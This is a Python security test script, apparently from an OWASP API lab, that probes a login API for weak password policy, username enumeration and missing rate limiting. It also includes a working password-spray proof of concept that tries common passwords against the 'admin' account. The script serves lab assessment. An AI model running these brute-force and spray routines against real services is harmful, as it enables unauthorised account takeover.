"""
Broken User Authentication tester  (OWASP API2:2019)
====================================================
Probes the target for:
  1. Weak password policy  (registration accepts trivial passwords)
  2. Username enumeration   (distinct error messages reveal valid users)
  3. No brute-force protection (repeated bad logins are never throttled)

Usage:
    python test_broken_auth.py            # against TARGET_URL (default localhost)
    TARGET_URL=http://host:5000 python test_broken_auth.py

Authorised lab use only.
"""
import uuid
import requests
from common import BASE_URL, TIMEOUT, banner, vuln, safe, info, login

findings = []


def test_weak_password_policy():
    info("Attempting to register a user with the weak password '123'")
    uname = f"weakpw_{uuid.uuid4().hex[:6]}"
    r = requests.post(f"{BASE_URL}/api/register",
                      json={"username": uname, "password": "123"},
                      timeout=TIMEOUT)
    if r.status_code in (200, 201):
        vuln("Trivial password '123' was accepted -> no password policy")
        findings.append("Weak password policy (accepts '123')")
    else:
        safe(f"Weak password rejected (HTTP {r.status_code})")


def test_username_enumeration():
    info("Comparing login errors for a known vs unknown username")
    _, _, s_unknown = login("definitely_not_a_user_xyz", "whatever")
    _, _, s_known = login("admin", "wrong-password-here")
    # Enumeration = the two negative cases are distinguishable
    if s_unknown != s_known:
        vuln(f"Responses differ (unknown={s_unknown}, known-bad-pw={s_known}) "
             f"-> usernames can be enumerated")
        findings.append("Username enumeration via differing login responses")
    else:
        safe(f"Uniform response for both cases (HTTP {s_known}) -> no enumeration")


def test_brute_force_protection():
    info("Firing 12 rapid failed logins for 'admin' to check for lockout/rate-limit")
    statuses = []
    for _ in range(12):
        _, _, s = login("admin", "bad-guess")
        statuses.append(s)
    if 429 in statuses:
        safe("Account throttled / locked out (HTTP 429 observed) -> brute-force mitigated")
    else:
        vuln("No throttling after 12 failures -> brute-force / credential-stuffing possible")
        findings.append("No rate limiting or lockout on login")


def test_password_spray_poc():
    """PoC: a tiny password spray that cracks the weak 'admin/admin' account."""
    info("PoC password spray against 'admin' with a small common-password list")
    common = ["123456", "password", "admin", "letmein", "qwerty"]
    for pw in common:
        token, role, status = login("admin", pw)
        if token:
            vuln(f"CRACKED: admin/{pw} -> token issued, role={role}")
            findings.append(f"Admin account cracked via spray (admin/{pw})")
            return token
    safe("Spray list did not crack the admin account")
    return None


if __name__ == "__main__":
    banner("API2 - Broken User Authentication")
    test_weak_password_policy()
    test_username_enumeration()
    test_brute_force_protection()
    test_password_spray_poc()
    print(f"\n  Summary: {len(findings)} authentication finding(s).")
    for f in findings:
        print(f"    - {f}")
